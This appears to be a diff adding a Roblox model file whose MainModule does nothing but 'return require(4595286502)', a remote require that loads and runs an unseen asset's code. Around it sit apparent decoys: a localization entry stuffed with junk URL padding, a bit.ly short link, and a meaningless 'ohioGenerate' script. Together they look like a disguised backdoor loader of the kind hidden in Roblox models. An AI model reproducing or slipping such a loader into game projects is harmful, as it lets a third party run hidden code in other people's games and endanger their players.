@@ -1,0 +1,28 @@
+<roblox version="4">
+	<Item class="ModuleScript" referent="RBX0">
+		<Properties>
+			<string name="Name">MainModule</string>
+			<string name="ScriptGuid">{9C22B30C-FB13-45D5-BC66-1FEF0F4D83EE}</string>
+			<ProtectedString name="Source">return require(4595286502)</ProtectedString>
+		</Properties>
+		<Item class="LocalizationTable" referent="RBX1">
+			<Properties>
+				<string name="Name">a</string>
+				<string name="SourceLocaleId">https://www.roblox.com/asset/?id=18181818181818181818&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;serverplaceid=132149141&amp;id=241949175&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;aeeeeeeee</string>
+			</Properties>
+		</Item>
+		<Item class="StringValue" referent="RBX2">
+			<Properties>
+				<string name="Name">gameValue</string>
+				<string name="Value">https://bit.ly/36tOmV0</string>
+			</Properties>
+		</Item>
+		<Item class="ModuleScript" referent="RBX3">
+			<Properties>
+				<string name="Name">ohioGenerate</string>
+				<string name="ScriptGuid">{00297DAA-E9E9-4C2E-B9B6-C4AB653CEFD3}</string>
+				<ProtectedString name="Source">tree = function()pcall(HasUnpublishedChangesForLinkedSource and '1738')end</ProtectedString>
+			</Properties>
+		</Item>
+	</Item>
+</roblox>
